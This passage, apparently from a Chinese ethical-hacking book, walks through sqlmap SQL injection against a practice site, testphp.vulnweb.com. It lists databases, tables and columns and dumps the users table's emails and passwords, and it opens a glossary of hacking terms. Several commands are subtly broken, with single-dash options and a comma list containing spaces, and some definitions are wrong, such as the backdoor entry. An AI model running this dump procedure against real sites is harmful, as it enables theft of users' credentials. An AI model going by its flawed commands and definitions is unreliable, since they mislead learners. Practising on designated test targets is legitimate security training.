    ## 第二步


    - 在命令行提示符下，输入 `sqlmap -u`，后接你想要测试的网站名称。为了本次练习，请输入 `sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1`。


    你可以使用名为 `-time-sec` 的命令来帮助加速，这在服务器运行缓慢时非常有用。


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -time-sec 15

    ```


    无论你选择哪种方式，完成后，你都将看到 MySQL 数据库版本以及一些更有用的信息。


    你可能会发现 `sqlmap` 向你提出了一些问题，这些问题需要简单的是/否（yes/no）回答。输入 `y` 表示是，输入 `n` 表示否。以下是你可能会遇到的一些消息：


    - 一条提示数据库很可能是 MySQL，并询问 `sqlmap` 是否应该忽略其他测试仅进行 MySQL 测试。你的答案应是 `y`。

    - 一条消息询问是否应该使用某些 MySQL 版本的有效负载（payloads）。答案完全取决于情况，但如果你不确定，请回答 `y`。


    ## 阐述 - 数据库


    接下来，我们将从数据库获取一些信息 - 名称、列名以及其他内容。


    ### 第三步


    首先，我们需要获取所有可用数据库的名称，因此，在命令行提示符下输入：


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs

    ```


    你应该看到两个数据库，一个名为 `information schema`，另一个名为 `acuart`。


    ### 表


    我们要的是 `acuart` 数据库 - 另一个更像是一个默认数据库，会存在于每个目标上。它包含了数据库和表结构的细节，但对我们来说没有其他有用的信息，至少对于我们的目的而言不是。


    ### 第四步


    现在我们需要告诉 `sqlmap` 我们想要哪个数据库，并要求它列出数据库表。在你的命令行提示符下输入：


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -tables

    ```


    你应该能看到一个表列表：


    Database: acuart

    8 tables（8 个表）

    - artists

    - carts

    - categ

    - featured

    - guestbook

    - pictures

    - products

    - users


    ### 列


    我们可以通过几个额外的命令执行相同的操作来获取列列表。我们最感兴趣的表是名为 `users` 的那一个，因为它可能包含黑客想要的敏感信息，例如用户名和密码。在你的命令行提示符下输入：


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users
    -columns

    ```


    现在我们使用 `-D` 指定数据库，使用 `-T` 指定表，然后使用 `--columns` 请求列。我希望你们现在已经开始掌握这种模式了。这里最吸引人的表是
    `users`。它可能包含该网站上注册用户的用户名和密码（黑客总是会寻找敏感数据）。


    最后的命令必须类似于这样——


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users
    -columns

    ```


    你应该会在屏幕上看到类似这样的内容：


    Database: acuart

    Table: users

    8 columns（8 列）


    | Column（列） | Type（类型） |

    | :--- | :--- |

    | address | mediumtext |

    | cart | varchar(100) |

    | cc | varchar(100) |

    | email | varchar(100) |

    | name | varchar(100) |

    | pass | varchar(100) |

    | phone | varchar(100) |

    | uname | varchar(100) |


    ### 数据


    接下来，我们可以从这些列中获取想要的数据，这次我们要几列，而不仅仅是一列。列名在命令中必须用逗号隔开；在命令行提示符下输入此：


    ```

    sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T users
    -C email, name, pass --dump

    ```


    结果应该是 John Smith，密码为 `test`，电子邮箱地址为 `email@email.com`??？没什么不起的，但如果你是在真实操作这些，你将会获得更多信息。


    你应该对这些信息做的是给网站管理员发送电子邮件，告诉他们他们的敏感数据存在漏洞，以及漏洞在哪里。不要掉入堕入黑暗的陷阱；监狱可不是好地方！


    如果你觉得目前这些信息很有价值，请务必在 [Amazon 上留出五星反馈](https://www.amazon.com/dp/B07NSRW9FZ)


    # 黑客术语表


    那些编写关于黑客的文章以及阅读这些文章的人所面临的最大挑战之一，就是了解相关的术语和词汇 - 而且术语非常多！准确性非常重要，在正确的位置使用正确的术语也是如此，因此，为了帮助你，我制作了一份你可能会遇到和/或作为道德黑客需要知道的术语列表。


    ## A


    ### 归因 (Attribution)


    这是确定攻击背后的个人或多人的过程。这倾向于确定攻击的来源，由于黑客可以使用多层在线服务来隐藏自己的身份和位置，这非常困难。在很多情况下，入侵很难追溯到特定的个人。


    ## B


    ### 后门 (Backdoor)


    当你通过正确的用户名和密码进入一个系统时，这就是后门。一些公司会留一个后门，以便黑客可以在不被察觉的情况下进入。这些后门可能会被利用。


    ### 黑帽 (Black hat)


    又被称为不道德的黑客，黑帽是指为了个人利益入侵系统并进行非法活动的人。


    ### 僵尸网络 (Botnet)


    僵尸网络，也被称为僵尸军，是一个所有计算机都被黑客控制的网络。黑客并不是购买所有这些计算机，而是利用恶意软件感染网络中的计算机，以便发动特定的攻击，例如 DDoS。你的系统可能是僵尸网络的一部分，而你可能永远都不知道。


    ### 暴力破解 (Brute force)


    暴力破解是破解密码最简单的方法之一。它是一种试错系统，使用词表列表来尝试正确的密码。如今，我们使用的加密系统倾向于减缓这些攻击，使得黑客在最短时间内尝试所有可能的组合变得困难得多，甚至是不可能的。


    ### 漏洞/缺陷 (Bug)


    每个人都听过 Bug；它是程序中某种描述的缺陷。有些没有害，而另一些则很容易被利用。苹果和谷歌等公司现在已经启动了漏洞赏计划，奖励那些发现并在黑客利用之前报告这些漏洞的人
    - 这是你作为道德黑客赚取额外收入的一种方式。


    ## C


    ### 破解 (Cracking)


    描述未经授权进入安全系统的通用方式。然而，虽然“破解”和“破解者”这两个词已与“黑客”和“黑客”同义，但这具有误导性。黑客是一个倾向于钻研且并不总是不道德的人，而破解者通常带有恶意（尽管并不总是如此）。


    ### 加密 (Crypto)


    密码学的简写，这指的是隐藏消息和数据使其不可肉眼可见的方法。


    ### 拆芯片攻击 (Chip-off)


    拆芯片攻击是指黑客需要从计算机上物理移除内存芯片，以便可以使用特殊程序抓取信息。执法部门已使用这种攻击来访问受 PGP 保护的黑色手机信息。


